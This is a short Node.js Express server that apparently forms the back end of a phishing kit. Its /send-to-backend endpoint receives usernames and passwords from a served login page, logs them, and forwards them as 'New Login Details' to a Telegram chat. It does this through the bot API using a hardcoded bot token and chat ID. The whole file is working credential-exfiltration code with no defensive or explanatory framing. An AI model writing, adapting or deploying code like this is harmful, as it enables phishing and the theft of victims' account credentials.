const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const app = express();
const PORT = 3000;

// Middleware to parse JSON
app.use(bodyParser.json());




// Serve static files (e.g., index.html)
app.use(express.static('public'));

// Replace with your bot token and chat ID
const BOT_TOKEN = '7973296853:AAEd_OT1S9H-CaJx4hK94Zj-ec1Vl47rAuY'; // Replace with your bot token
const CHAT_ID = '5605345504'; // Replace with your chat ID

// Endpoint to handle form submission
app.post('/send-to-backend', async (req, res) => {
    const { username, password } = req.body;

    // Log the received data
    console.log('Received data:', { username, password });

    // Send the data to Telegram
    try {
        const message = `New Login Details:\nUsername: ${username}\nPassword: ${password}`;
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
        });

        console.log('Data sent to Telegram successfully!');
        res.json({ success: true, message: 'Data sent to Telegram successfully!' });
    } catch (error) {
        console.error('Error sending data to Telegram:', error);
        res.status(500).json({ success: false, message: 'Failed to send data to Telegram.' });
    }
});

// Serve index.html for the root route
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
